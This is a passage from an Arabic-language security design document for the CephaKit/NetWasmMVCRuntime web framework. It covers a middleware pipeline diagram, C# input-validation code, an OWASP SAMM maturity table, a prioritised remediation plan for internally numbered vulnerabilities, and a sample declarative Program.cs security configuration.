│         ↓                                                      │
│  3. UseCors(allowedOrigins)    ← CVE-CEP-002                  │
│     Origin whitelist + Vary header                             │
│         ↓                                                      │
│  4. UseSecurityHeaders()       ← CVE-CEP-010                  │
│     CSP + HSTS + X-Frame + Permissions-Policy                  │
│         ↓                                                      │
│  5. UseAuthentication()        ← جديد                         │
│     Token → Session → InjectSessionItems → ClaimsPrincipal    │
│         ↓                                                      │
│  6. UseAuditLog()              ← CEP-001                      │
│     سجل كل الطلبات في CephaFS                                 │
│         ↓                                                      │
│  7. UseServiceScope()          ← موجود                        │
│     DI scope per request                                       │
│         ↓                                                      │
│  8. UseLogging()               ← موجود                        │
│     Method + Path + Status + ms                                │
│         ↓                                                      │
│  9. MvcEngine.ProcessRequest() ← CVE-CEP-005                  │
│     [Authorize] + [AllowAnonymous] + [ValidateAntiForgery]     │
│         ↓                                                      │
│  10. AutoPersistDb()           ← CEP-001                      │
│      بعد POST: persist DB إلى KV                               │
└────────────────────────────────────────────────────────────────┘
         ↓
    الاستجابة
```

**تعادل ASP.NET Core:** نفس ترتيب `app.Use*()` في `Program.cs` — يُطبَّق على CephaKit بنفس النهج الإعلاني.

---

## 6. `DataAnnotations` — التحقق من المدخلات

```csharp
// WasmMvcRuntime.Abstractions/Validation/CephaModelValidator.cs
// لا Shim — يستخدم System.ComponentModel.DataAnnotations الحقيقي

public static class CephaModelValidator
{
    public static ModelValidationResult Validate(object model)
    {
        var context = new ValidationContext(model);
        var results = new List<ValidationResult>();
        bool valid  = Validator.TryValidateObject(
            model, context, results, validateAllProperties: true);

        return new ModelValidationResult(valid, results
            .Select(r => new ValidationError(
                r.MemberNames.FirstOrDefault() ?? "",
                r.ErrorMessage ?? ""))
            .ToList());
    }
}

public record ModelValidationResult(
    bool IsValid,
    IReadOnlyList<ValidationError> Errors
);

public record ValidationError(string Field, string Message);
```

```csharp
// في MvcEngine — model binding مع validation
private object? BindParameter(ParameterInfo p,
    IInternalHttpContext context)
{
    var instance = BindFromContext(p, context);

    if (instance != null)
    {
        var validation = CephaModelValidator.Validate(instance);
        if (!validation.IsValid)
        {
            // حقن errors في ModelState
            foreach (var err in validation.Errors)
                context.ModelState?.AddModelError(
                    err.Field, err.Message);
        }
    }

    return instance;
}
```

**تعادل ASP.NET Core:** `[Required]` · `[StringLength]` · `[Range]` · `[EmailAddress]` · `ModelState.IsValid`

---

## 7. جدول تقييم النضج الأمني

```
┌─────────────────────────────────────────────────────────────────────┐
│  مقياس النضج: OWASP SAMM 2.0                                        │
│  مستويات: 0 (غائب) → 1 (أساسي) → 2 (منظَّم) → 3 (مُحكَم)          │
├───────────────────────────┬────────────┬────────────┬───────────────┤
│  المجال                   │ الحالي    │ بعد CEP-SEC│ ASP.NET Core  │
├───────────────────────────┼────────────┼────────────┼───────────────┤
│ التحقق من المدخلات         │ 1          │ 2          │ 3             │
│ إدارة المصادقة             │ 2          │ 3          │ 3             │
│ إدارة الجلسات             │ 2          │ 3          │ 3             │
│ التحكم في الوصول           │ 0          │ 2          │ 3             │
│ تشفير البيانات             │ 1          │ 2          │ 3             │
│ معالجة الأخطاء            │ 1          │ 2          │ 2             │
│ تسجيل الأحداث             │ 0          │ 2          │ 2             │
│ حماية الاتصالات            │ 1          │ 2          │ 3             │
│ حماية من Injection         │ 0          │ 2          │ 3             │
│ إدارة التبعيات             │ 2          │ 2          │ 3             │
├───────────────────────────┼────────────┼────────────┼───────────────┤
│  المتوسط الكلي             │ 1.0 / 3    │ 2.2 / 3    │ 2.8 / 3       │
└───────────────────────────┴────────────┴────────────┴───────────────┘
```

---

## 8. خطة التطبيق — أولويات إلزامية

| الأولوية | CVE | الإجراء | الجهد | الأثر |
|---------|-----|---------|-------|-------|
| **P0 — فوري** | CVE-CEP-001 | DOMPurify في `applyFrame()` | ساعات | يمنع XSS حرج |
| **P0 — فوري** | CVE-CEP-005 | `[Authorize]` في MvcEngine | يوم | يُغلق Broken Access Control |
| **P0 — فوري** | CVE-CEP-006 | `postMessage` origin check | ساعات | يمنع message injection |
| **P1 — أسبوع 1** | CVE-CEP-002 | CORS Origin Allowlist | ساعات | يمنع CSRF |
| **P1 — أسبوع 1** | CVE-CEP-003 | SSE/SignalR Token Auth | يوم | يُغلق unauthorized streams |
| **P1 — أسبوع 1** | CVE-CEP-007 | Rate Limiting في `main.mjs` | يوم | يمنع DoS |
| **P1 — أسبوع 1** | CVE-CEP-010 | Security Headers + CSP | ساعات | دفاع في العمق |
| **P2 — أسبوع 2** | CVE-CEP-004 | AES-GCM لـ OPFS الحساس | 3 أيام | يحمي الجلسات والـ key |
| **P2 — أسبوع 2** | CVE-CEP-011 | Session isolation بـ tokenId | يوم | يمنع session leakage |
| **P2 — أسبوع 2** | — | `ClaimsPrincipal` في `InternalHttpContext` | يوم | تعادل كامل مع ASP.NET |
| **P3 — أسبوع 3** | — | `AntiForgery` + `[ValidateAntiForgeryToken]` | يومان | CSRF protection |
| **P3 — أسبوع 3** | CVE-CEP-009 | Multi-source fingerprint | يوم | يُعزِّز session binding |
| **P3 — أسبوع 3** | CVE-CEP-008 | localStorage filtering | ساعة | يقلل تسريب البيانات |
| **P3 — أسبوع 3** | CVE-CEP-012 | KV namespace isolation | يوم | يمنع key collisions |
| **P4 — شهر 2** | CVE-CEP-013 | `/_cepha/info` filtering | ساعات | يمنع info disclosure |
| **P4 — شهر 2** | — | `DataAnnotations` validation | أسبوع | تعادل model validation |
| **P4 — شهر 2** | — | `CephaAuditLog` في CephaFS | أسبوع | رصد ومطابقة |

---

## 9. الإعلانات الأمنية في Program.cs

بعد التطبيق الكامل، يصبح Program.cs مطابقاً لنهج ASP.NET Core:

```csharp
// Program.cs (CephaKit) — النهج الإعلاني الكامل
// مطابق لـ ASP.NET Core MVC بدون Shims

services.AddCephaKit(options =>
{
    // ── Database ──────────────────────────────────────────
    options.ConnectionString         = "Data Source=app.db";
    options.IdentityConnectionString = "Data Source=identity.db";
    options.AutoPersistDb            = true;

    // ── Topology ──────────────────────────────────────────
    options.ControllersOnServer = true;

    // ── Security ──────────────────────────────────────────
    options.AllowedOrigins = new[]
    {
        "https://my-app.pages.dev",
        "https://my-domain.com"
    };
    options.EnableAuditLog  = true;
    options.EnableAntiForgery = true;

    // ── File System ───────────────────────────────────────
    options.FileEnvironment = CephaFileEnvironment.CloudflareKV;
});

// ─────────────────────────────────────────────────────────
// Pipeline مطابق لـ app.Use*() في ASP.NET Core
// ─────────────────────────────────────────────────────────
// (يُبنى تلقائياً من CephaKit بناءً على الـ options)

// CephaRequestPipeline يُنفِّذ بالترتيب:
// .UseRateLimiting()
// .UseExceptionHandler()
// .UseCors(options.AllowedOrigins)
// .UseSecurityHeaders()
// .UseAuthentication()
// .UseAuditLog()
// .UseServiceScope()
// .UseLogging()
// [MVC Terminal — يتضمن Authorize + AntiForgery]
```

---

*وثيقة `CEP-SEC-001` — النموذج الأمني الشامل*
*NetWasmMVCRuntime · sbay-dev · أبريل 2026 · MIT License*
*المراجعة التالية: يوليو 2026*